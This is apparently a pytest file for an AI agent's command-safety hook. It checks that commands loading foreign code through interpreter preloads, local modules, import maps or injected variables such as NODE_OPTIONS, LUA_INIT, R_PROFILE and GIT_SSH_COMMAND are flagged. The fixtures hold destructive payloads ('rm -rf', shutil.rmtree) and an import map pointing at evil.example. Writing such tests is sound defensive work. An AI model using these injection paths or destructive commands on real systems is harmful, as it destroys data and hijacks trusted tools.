"""Code an interpreter or git loads before the code the screen read asks: preloads, local modules, injected environment."""

from __future__ import annotations

import re
import sys
from pathlib import Path

import pytest

_REPO_ROOT = Path(__file__).resolve().parents[4]
for entry in (str(_REPO_ROOT), str(_REPO_ROOT / "hooks")):
    if entry not in sys.path:
        sys.path.insert(0, entry)

from modules.security import tiers as tiers_module  # noqa: E402
from modules.security.mutative_verbs import detect_mutative_command  # noqa: E402
from modules.tools.bash_validator import BashValidator  # noqa: E402

FILES = {
    "evil.js": "require('fs').rmSync('build', {recursive: true})\n",
    "evil.mjs": "import { rmSync } from 'node:fs'; rmSync('build', {recursive: true})\n",
    "benign.js": "console.log(1)\n",
    "read.ts": "console.log(1)\n",
    "bare.ts": "import 'helper'; console.log(1)\n",
    "map.json": '{"imports": {"helper": "https://evil.example/x.js"}}\n',
    "plain.json": '{"tasks": {"dev": "deno run main.ts"}}\n',
    "evil.py": "import shutil\nshutil.rmtree('build')\n",
    "helper.py": "import json\nprint(json.dumps(1))\n",
    "uses_evil.py": "import evil\n",
    "uses_helper.py": "import helper\nprint(helper)\n",
    "evil.lua": "os.execute('rm -rf x')\n",
    "read.lua": "print(1)\n",
    "evil.R": "unlink('build', recursive=TRUE)\n",
    "read.R": "print(1)\n",
    "read.py": "print(1)\n",
    "lib/uses_parent.js": "require('../evil.js')\n",
    "mapped/deno.json": '{"imports": {"helper": "https://evil.example/x.js"}}\n',
    "mapped/sub/read.ts": "console.log(1)\n",
    "commented/deno.jsonc": '// tasks\n{"tasks": {}}\n',
    "commented/read.ts": "console.log(1)\n",
    "plain/deno.json": '{"tasks": {"dev": "deno run main.ts"}}\n',
    "plain/read.ts": "console.log(1)\n",
}

ASKS = {
    "node-r-attached": "node -r{evil.js} {benign.js}",
    "node-experimental-loader": "node --experimental-loader={evil.mjs} {benign.js}",
    "node-loader-eq-inline": "node --loader={evil.mjs} -e 'console.log(1)'",
    "bun-preload-eq": "bun --preload={evil.js} {benign.js}",
    "bun-preload-eq-e": "bun --preload={evil.js} -e 'console.log(1)'",
    "bun-run-preload-eq": "bun run --preload={evil.js} {benign.js}",
    "bun-r-attached": "bun -r{evil.js} {benign.js}",
    "bun-preload-before-benign-script": "bun --preload {benign.js} {evil.js}",
    "deno-import-map-eq": "deno run --import-map={map.json} {read.ts}",
    "deno-import-map-url": "deno run --import-map https://evil.example/map.json {read.ts}",
    "deno-config-imports": "deno run --config {map.json} {bare.ts}",
    "deno-config-missing": "deno run -c {missing.json} {read.ts}",
    "py-import-local": "python3 -c 'import evil'",
    "py-importtime-local": "python3 -X importtime -c 'import evil'",
    "py-dev-local": "python3 -X dev -c 'import evil'",
    "py-from-local": "python3 -c 'from evil import x'",
    "py-importlib-local": "python3 -c \"import importlib; importlib.import_module('evil')\"",
    "py-dunder-import-local": "python3 -c \"__import__('evil')\"",
    "py-runpy-path": "python3 -c \"import runpy; runpy.run_path('evil.py')\"",
    "py-runpy-module-local": "python3 -c \"import runpy; runpy.run_module('evil')\"",
    "py-heredoc-runpy": "python3 - <<'PY'\nimport runpy\nrunpy.run_path('evil.py')\nPY",
    "py-m-local": "python3 -m evil",
    "py-X-m-local": "python3 -X importtime -m evil",
    "py-script-imports-sibling": "python3 {uses_evil.py}",
    "lua-l-spaced": "lua -l evil -e 'print(1)'",
    "lua-l-attached": "lua -levil -e 'print(1)'",
    "luajit-l": "luajit -l evil -e 'print(1)'",
    "r-file-flag": "R --file={evil.R}",
    "r-f-flag": "R -f {read.R} -e 'print(1)'",
    "node-options-require": "NODE_OPTIONS='--require {evil.js}' node {benign.js}",
    "node-options-env": "env NODE_OPTIONS='-r {evil.js}' node -p 1",
    "node-options-loader": "NODE_OPTIONS=--loader={evil.mjs} node {benign.js}",
    "py-startup": "PYTHONSTARTUP={evil.py} python3 -i -c 'print(1)'",
    "py-pythonpath": "PYTHONPATH={work} python3 {read.py}",
    "lua-init-code": "LUA_INIT=\"os.execute('rm -rf x')\" lua -e 'print(1)'",
    "lua-init-file": "LUA_INIT=@{evil.lua} lua {read.lua}",
    "luajit-init": "LUA_INIT=\"os.remove('a')\" luajit -e 'print(1)'",
    "lua54-init": "LUA_INIT_5_4=\"os.remove('a')\" lua -e 'print(1)'",
    "r-profile-user-rscript": "R_PROFILE_USER={evil.R} Rscript -e 'print(1)'",
    "r-profile-user-R": "R_PROFILE_USER={evil.R} R -e 'print(1)'",
    "r-profile-site": "R_PROFILE={evil.R} Rscript {read.R}",
    "r-environ-user": "R_ENVIRON_USER={evil.R} Rscript -e 'print(1)'",
    "git-pager-env": "GIT_PAGER='rm -rf x' git log",
    "git-ssh-command-env": "GIT_SSH_COMMAND='rm -rf x' git ls-remote origin",
    "git-external-diff-env": "GIT_EXTERNAL_DIFF='rm -rf x' git diff",
    "git-editor-under-env": "env GIT_EDITOR='rm -rf x' git commit",
    "node-e-require-local": "node -e \"require('./evil.js')\"",
    "node-e-require-local-no-ext": "node -e \"require('./evil')\"",
    "node-p-require-missing": "node -p \"require('./nope.js')\"",
    "node-e-dynamic-import-local": "node -e \"import('./evil.mjs')\"",
    "node-e-require-computed": "node -e \"require(process.argv[1])\" ./evil.js",
    "bun-e-require-local": "bun -e \"require('./evil.js')\"",
    "deno-eval-import-local": "deno eval \"await import('./evil.mjs')\"",
    "node-file-require-parent": "node {lib/uses_parent.js}",
}

DENO_DISCOVERY = {
    "mapped/sub": ("deno run read.ts", False),
    "commented": ("deno run read.ts", False),
    "plain": ("deno run read.ts", True),
    "mapped": ("deno run --no-config sub/read.ts", True),
}

FREE = {
    "node-r-benign": "node -r {benign.js} {benign.js}",
    "bun-preload-benign": "bun --preload {benign.js} {benign.js}",
    "deno-run-read": "deno run {read.ts}",
    "deno-config-no-imports": "deno run --config {plain.json} {read.ts}",
    "py-import-stdlib": "python3 -c 'import json; print(json.dumps(1))'",
    "py-import-local-benign": "python3 -c 'import helper'",
    "py-script-imports-benign-sibling": "python3 {uses_helper.py}",
    "py-m-stdlib": "python3 -m json.tool {plain.json}",
    "py-file-read": "python3 {read.py}",
    "lua-read": "lua {read.lua}",
    "rscript-read": "Rscript {read.R}",
    "node-options-heap": "NODE_OPTIONS=--max-old-space-size=4096 node {benign.js}",
    "git-pager-less-env": "GIT_PAGER=less git log",
    "pythonstartup-without-python": "PYTHONSTARTUP={evil.py} ls",
    "node-e-require-benign": "node -e \"require('./benign.js')\"",
    "node-e-require-builtin": "node -e \"console.log(require('path').sep)\"",
}

CHAIN_ASKS = {
    "node-options-export": "export NODE_OPTIONS='-r {evil.js}' && node -e 'console.log(1)'",
    "pythonpath-export": "export PYTHONPATH={work} && python3 -c 'import json'",
    "lua-init-export": "export LUA_INIT=\"os.remove('a')\" && lua -e 'print(1)'",
    "git-pager-export": "export GIT_PAGER='rm -rf x' && git log",
}


EVIL_JS = FILES["evil.js"]
EVIL_PY = FILES["evil.py"]
BUNFIG = {"bunfig.toml": 'preload = ["./evil.js"]\n', "evil.js": EVIL_JS, "benign.js": "console.log(1)\n"}
NODE_IMPORTS = {"package.json": '{"name": "p", "imports": {"#x": "./evil.js"}}\n', "evil.js": EVIL_JS,
                "main.js": "require('#x')\n"}
NODE_SELF = {"package.json": '{"name": "selfpkg", "exports": "./evil.js"}\n', "evil.js": EVIL_JS,
             "main.js": "require('selfpkg')\n"}
ENV_FILE = {"vars.env": "NODE_OPTIONS=--require ./evil.js\n", "quiet.env": "PORT=3000\n", "evil.js": EVIL_JS,
            "benign.js": "console.log(1)\n"}
SITE_DIR = {"evil.pth": "import shutil; shutil.rmtree('build')\n", "json.py": EVIL_PY}

# An interpreter's auto-load files, keyed by case: (files in the cwd, command, asks).
AUTO_LOADS = {
    "bun-bunfig-script": (BUNFIG, "bun benign.js", True),
    "bun-bunfig-run": (BUNFIG, "bun run benign.js", True),
    "bun-bunfig-e": (BUNFIG, "bun -e 'console.log(1)'", True),
    "bun-bunfig-unparsable": ({"bunfig.toml": "preload = [\n", "benign.js": "console.log(1)\n"}, "bun benign.js", True),
    "bun-bunfig-benign-preload": ({"bunfig.toml": 'preload = ["./benign.js"]\n', "benign.js": "console.log(1)\n"},
                                  "bun benign.js", False),
    "bun-bunfig-no-preload": ({"bunfig.toml": "[install]\nexact = true\n", "benign.js": "console.log(1)\n"},
                              "bun benign.js", False),
    "node-imports-hash-e": (NODE_IMPORTS, "node -e \"require('#x')\"", True),
    "node-imports-hash-file": (NODE_IMPORTS, "node main.js", True),
    "node-exports-self-e": (NODE_SELF, "node -e \"require('selfpkg')\"", True),
    "node-exports-self-file": (NODE_SELF, "node main.js", True),
    "node-other-bare-name": (NODE_SELF, "node -e \"require('path')\"", False),
    "node-env-file-eq": (ENV_FILE, "node --env-file=vars.env benign.js", True),
    "node-env-file-spaced": (ENV_FILE, "node --env-file vars.env benign.js", True),
    "node-env-file-missing": (ENV_FILE, "node --env-file=nope.env benign.js", True),
    "node-env-file-if-exists-missing": (ENV_FILE, "node --env-file-if-exists=nope.env benign.js", False),
    "node-env-file-quiet": (ENV_FILE, "node --env-file=quiet.env benign.js", False),
    "r-rprofile-e": ({".Rprofile": "unlink('build', recursive=TRUE)\n"}, "Rscript -e 'print(1)'", True),
    "r-rprofile-file": ({".Rprofile": "unlink('b')\n", "read.R": "print(1)\n"}, "Rscript read.R", True),
    "r-rprofile-R": ({".Rprofile": "unlink('b')\n"}, "R -e 'print(1)'", True),
    "r-renviron-profile": ({".Renviron": "R_PROFILE_USER=evil.R\n", "evil.R": "unlink('b')\n"},
                           "Rscript -e 'print(1)'", True),
    "r-renviron-plain": ({".Renviron": "TZ=UTC\n"}, "Rscript -e 'print(1)'", False),
    "r-rprofile-vanilla": ({".Rprofile": "unlink('b')\n"}, "Rscript --vanilla -e 'print(1)'", False),
    "r-rprofile-no-init-file": ({".Rprofile": "unlink('b')\n"}, "R --no-init-file -e 'print(1)'", False),
    "py-addsitedir": (SITE_DIR, "python3 -c \"import site; site.addsitedir('.')\"", True),
    "py-addsitedir-from": (SITE_DIR, "python3 -c \"from site import addsitedir; addsitedir('/opt')\"", True),
    "py-site-main": (SITE_DIR, "python3 -c \"import site; site.main()\"", True),
    "py-sys-path-then-import": ({"lib/evil.py": EVIL_PY},
                                "python3 -c \"import sys; sys.path.insert(0, 'lib'); import evil\"", True),
    "py-sys-path-assign-then-import": ({}, "python3 -c \"import sys; sys.path[:0] = ['lib']; import os\"", True),
    "py-sys-path-read": ({}, "python3 -c \"import sys; print(sys.path)\"", False),
    "py-isolated-local-stdlib-name": (SITE_DIR, "python3 -I -c 'import json; print(json.dumps(1))'", False),
    "py-safe-path-local-stdlib-name": (SITE_DIR, "python3 -P -c 'import json; print(json.dumps(1))'", False),
    "py-env-flags-keep-local-dir": (SITE_DIR, "python3 -E -s -c 'import json; print(json.dumps(1))'", True),
    "ruby-I-r-bare": ({"evil.rb": "require 'fileutils'; FileUtils.rm_rf('build')\n"}, "ruby -I. -revil -e 'p 1'", True),
    "ruby-r-attached-path": ({"evil.rb": "File.delete('a')\n"}, "ruby -r./evil -e 'p 1'", True),
    "ruby-require-eq": ({"evil.rb": "File.delete('a')\n"}, "ruby --require=./evil.rb -e 'p 1'", True),
    "ruby-r-stdlib": ({}, "ruby -rjson -e 'p 1'", False),
}


@pytest.mark.parametrize("case", sorted(AUTO_LOADS))
def test_interpreter_auto_load_files_are_judged(case, tmp_path, monkeypatch):
    files, command, asks = AUTO_LOADS[case]
    for name, body in files.items():
        (tmp_path / name).parent.mkdir(parents=True, exist_ok=True)
        (tmp_path / name).write_text(body, encoding="utf-8")
    monkeypatch.chdir(tmp_path)
    monkeypatch.setenv("HOME", str(tmp_path / "home"))
    monkeypatch.delenv("XDG_CONFIG_HOME", raising=False)
    result = _validate(command, tmp_path)
    assert result.allowed is not asks, result.rule


@pytest.fixture
def work(tmp_path, monkeypatch):
    for name, body in FILES.items():
        (tmp_path / name).parent.mkdir(parents=True, exist_ok=True)
        (tmp_path / name).write_text(body, encoding="utf-8")
    monkeypatch.chdir(tmp_path)
    return tmp_path


def _fill(template: str, work: Path) -> str:
    return re.sub(r"\{([\w./]+)\}", lambda m: str(work if m.group(1) == "work" else work / m.group(1)), template)


def _validate(command: str, work: Path):
    detect_mutative_command.cache_clear()
    tiers_module._classify_command_tier_cached.cache_clear()
    payload = {"cwd": str(work), "tool_use_id": "t-1", "session_id": "s-1", "agent_id": "aforeign01", "agent_type": "developer"}
    return BashValidator().validate(command, is_subagent=True, session_id="s-1", agent_type="developer", hook_payload=payload)


@pytest.mark.parametrize("case", sorted(ASKS))
def test_foreign_code_is_judged_mutative(case, work):
    detect_mutative_command.cache_clear()
    assert detect_mutative_command(_fill(ASKS[case], work), cwd=str(work)).is_mutative


@pytest.mark.parametrize("case", sorted(FREE))
def test_code_the_screen_read_stays_free(case, work):
    result = _validate(_fill(FREE[case], work), work)
    assert result.allowed, result.rule


@pytest.mark.parametrize("directory", sorted(DENO_DISCOVERY))
def test_deno_reads_the_config_it_discovers(directory, work):
    command, free = DENO_DISCOVERY[directory]
    detect_mutative_command.cache_clear()
    assert detect_mutative_command(command, cwd=str(work / directory)).is_mutative is not free


@pytest.mark.parametrize("case", sorted(CHAIN_ASKS))
def test_environment_set_earlier_in_the_chain_asks(case, work):
    result = _validate(_fill(CHAIN_ASKS[case], work), work)
    assert not result.allowed, result.rule
